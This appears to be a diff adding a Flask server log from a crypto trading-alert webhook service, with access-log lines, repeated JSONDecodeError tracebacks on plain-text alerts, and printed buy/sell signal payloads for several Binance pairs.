+151.135.4.55 - - [12/Jul/2023 16:12:46] "POST /api/drsi_with_filters HTTP/1.1" 200 153 0.001102
+151.135.4.55 - - [12/Jul/2023 16:12:56] "POST /api/drsi_with_filters HTTP/1.1" 200 153 0.000934
+(22236) accepted ('34.212.75.30', 30632)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:13:07] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.006627
+(22236) accepted ('52.32.178.7', 46936)
+(22236) accepted ('34.212.75.30', 30634)
+(22236) accepted ('52.32.178.7', 46940)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:13:07] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.003503
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:13:07] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.006841
+52.32.178.7 - - [12/Jul/2023 16:13:07] "POST /api/drsi_with_filters HTTP/1.1" 200 148 0.000993
+(22236) accepted ('34.212.75.30', 31172)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:13:12] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004131
+(22236) accepted ('52.32.178.7', 47484)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:13:12] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004686
+(22236) accepted ('34.212.75.30', 31176)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:13:12] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004399
+(22236) accepted ('52.32.178.7', 48100)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:13:17] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.003768
+(22236) accepted ('52.32.178.7', 48102)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:13:17] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004239
+(22236) accepted ('52.32.178.7', 48106)
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:12:04-----------------------------'
+(b'{\n    "strategy_name" : "drsi_with_filters",\n    "action": "buy",\n    "a'
+ b'lert_message": "",\n    "contracts": "0.019893",\n    "market_position": "'
+ b'long",\n    "market_position_size": "0.009942",\n    "order_id": "long",\n '
+ b'   "position_size": "0.009942",\n    "price": "23027.08",\n    "ticker": "'
+ b'BTCBUSD"\n}')
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:12:06-----------------------------'
+b'D-RSI Short BINANCE:COMPUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:12:06-----------------------------'
+b'D-RSI Exit Short BINANCE:COMPUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:12:06-----------------------------'
+b'D-RSI Exit Long BINANCE:COMPUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:12:06-----------------------------'
+(b'    {\n    "strategy_name" : "drsi_with_filters",\n    "alert_message":"",'
+ b'\n    "action": "sell",\n    "contracts": "3.127", \n    "market_position":'
+ b' "short",\n    "market_position_size": "1.563",\n    "order_id": "short",\n'
+ b'    "price": "66.6",\n    "ticker": "COMPUSDT",\n    "firetime" : "2023-07'
+ b'-12T13:12:06Z",\n    "interval" : "1"\n    }')
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:12:11-----------------------------'
+b'D-RSI Short BINANCE:COMPUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:12:11-----------------------------'
+b'D-RSI Exit Short BINANCE:COMPUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:12:11-----------------------------'
+b'D-RSI Exit Long BINANCE:COMPUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:12:16-----------------------------'
+b'D-RSI Short BINANCE:COMPUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:12:16-----------------------------'
+b'D-RSI Exit Short BINANCE:COMPUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:12:16-----------------------------'
+b'D-RSI Exit Long BINANCE:COMPUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:12:22-----------------------------'
+b'D-RSI Short BINANCE:COMPUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:12:22-----------------------------'
+b'D-RSI Exit Short BINANCE:COMPUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:12:22-----------------------------'
+b'D-RSI Exit Long BINANCE:COMPUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:12:32-----------------------------'
+(b'{\n    "strategy_name" : "drsi_with_filters",\n    "action": "buy",\n    "a'
+ b'lert_message": "",\n    "contracts": "0.019893",\n    "market_position": "'
+ b'long",\n    "market_position_size": "0.009942",\n    "order_id": "long",\n '
+ b'   "position_size": "0.009942",\n    "price": "23027.08",\n    "ticker": "'
+ b'BTCBUSD"\n}')
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:12:46-----------------------------'
+(b'{\n    "strategy_name" : "drsi_with_filters",\n    "action": "buy",\n    "a'
+ b'lert_message": "",\n    "contracts": "0.019893",\n    "market_position": "'
+ b'long",\n    "market_position_size": "0.009942",\n    "order_id": "long",\n '
+ b'   "position_size": "0.009942",\n    "price": "23027.08",\n    "ticker": "'
+ b'BTCBUSD"\n}')
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:12:56-----------------------------'
+(b'{\n    "strategy_name" : "drsi_with_filters",\n    "action": "buy",\n    "a'
+ b'lert_message": "",\n    "contracts": "0.019893",\n    "market_position": "'
+ b'long",\n    "market_position_size": "0.009942",\n    "order_id": "long",\n '
+ b'   "position_size": "0.009942",\n    "price": "23027.08",\n    "ticker": "'
+ b'BTCBUSD"\n}')
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:13:07-----------------------------'
+b'D-RSI Short BINANCE:VETUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:13:07-----------------------------'
+b'D-RSI Exit Long BINANCE:VETUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:13:07-----------------------------'
+b'D-RSI Exit Short BINANCE:VETUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:13:07-----------------------------'
+(b'    {\n    "strategy_name" : "drsi_with_filters",\n    "alert_message":"",'
+ b'\n    "action": "sell",\n    "contracts": "1315.242", \n    "market_positio'
+ b'n": "short",\n    "market_position_size": "656.783",\n    "order_id": "sho'
+ b'rt",\n    "price": "0.01906",\n    "ticker": "VETUSDT",\n    "firetime" : "'
+ b'2023-07-12T13:13:06Z",\n    "interval" : "1"\n    }')
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:13:12-----------------------------'
+b'D-RSI Short BINANCE:VETUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:13:12-----------------------------'
+b'D-RSI Exit Long BINANCE:VETUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:13:12-----------------------------'
+b'D-RSI Exit Short BINANCE:VETUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:13:17-----------------------------'
+b'D-RSI Short BINANCE:VETUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:13:17-----------------------------'
+b'D-RSI Exit Long BINANCE:VETUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:13:17] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004079
+(22236) accepted ('34.212.75.30', 32254)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:13:23] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004129
+(22236) accepted ('34.212.75.30', 32256)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:13:23] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004118
+(22236) accepted ('52.32.178.7', 48578)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
